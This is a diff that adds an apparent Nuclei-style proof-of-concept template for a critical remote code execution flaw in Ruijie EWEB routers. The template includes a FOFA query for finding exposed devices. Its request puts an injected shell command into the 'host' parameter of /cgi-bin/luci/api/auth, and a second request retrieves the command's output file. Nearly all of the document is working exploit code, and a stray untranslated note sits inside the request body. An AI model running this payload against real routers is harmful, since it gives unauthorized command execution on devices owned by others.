@@ -1,0 +1,39 @@
+id: poc-cdgzfkp93y3f2zrq
+info:
+  name: 锐捷EWEB路由器auth 存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cdgzfkp93y3f2zrq'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cdgzfkp93y3f2zrq
+    fofa: body="cgi-bin/luci" && body="#f47f3e"
+http:
+- raw:
+  - 'POST /cgi-bin/luci/api/auth HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"method":"checkNet","params":{"host":"`id >test.txt`"}}
+
+    读取文件'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /cgi-bin/test.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
